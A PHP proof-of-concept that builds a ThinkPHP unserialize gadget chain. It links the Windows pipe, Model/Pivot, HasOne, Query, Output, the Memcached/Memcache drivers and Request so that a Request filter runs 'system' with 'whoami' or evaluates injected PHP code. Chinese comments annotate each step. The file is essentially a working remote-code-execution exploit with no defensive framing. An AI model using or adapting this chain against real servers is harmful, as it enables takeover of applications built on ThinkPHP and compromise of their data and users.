<?php

namespace think\process\pipes {

    class Windows
    {

        private $files = [];

        public function __construct($files)
        {

            $this->files = [$files]; //$file => /think/Model的子类new Pivot(); Model是抽象类
        }
    }
}

namespace think {

    abstract class Model
    {

        protected $append = [];
        protected $error = null;
        public $parent;

        function __construct($output, $modelRelation)
        {

            $this->parent = $output;  //$this->parent=> think\console\Output;
            $this->append = array("xxx" => "getError");     //调用getError 返回this->error
            $this->error = $modelRelation;               // $this->error 要为 relation类的子类，并且也是OnetoOne类的子类==>>HasOne
        }
    }

    class Request
    {
        protected $get = ['gml' => 'whoami']; 
        protected $filter = ['system', 'a'];

        public function __construct($code)
        {
            $this->get = ['gml' => "<?php $code?>"];
            $this->filter = [[new \think\view\driver\Php, "display"], 'a'];
        }
    }
}

namespace think\model {

    use think\Model;

    class Pivot extends Model
    {

        function __construct($output, $modelRelation)
        {

            parent::__construct($output, $modelRelation);
        }
    }
}

namespace think\model\relation {

    class HasOne extends OneToOne
    {


    }


    abstract class OneToOne
    {

        protected $selfRelation;
        protected $bindAttr = [];
        protected $query;

        function __construct($query)
        {

            $this->selfRelation = 0;
            $this->query = $query;    //$query指向Query
            $this->bindAttr = ['xxx'];// $value值，作为call函数引用的第二变量
        }
    }

}

namespace think\db {

    class Query
    {

        protected $model;

        function __construct($model)
        {

            $this->model = $model; //$this->model=> think\console\Output;
        }
    }
}

namespace think\console {

    use think\session\driver\Memcached;

    class Output
    {

        private $handle;
        protected $styles;

        function __construct($code)
        {

            $this->styles = ['getAttr'];
            $this->handle = new Memcached($code); //$handle->think\session\driver\Memcached
        }

    }
}

namespace think\session\driver {

    use think\cache\driver\Memcache;

    class Memcached
    {

        protected $handler;
        protected $config = [
            'session_name' => '//',
            'expire' => '1'
        ];

        function __construct($code)
        {

            $this->handler = new Memcache($code);
        }
    }
}

namespace think\cache\driver {

    use think\Request;

    class Memcache
    {
        protected $handler;
        protected $tag = 1;
        protected $options = ['prefix' => 'gml/'];

        function __construct($code)
        {
            $this->handler = new Request($code);
        }
    }

}

namespace think\view\driver {
    class Php {

    }
}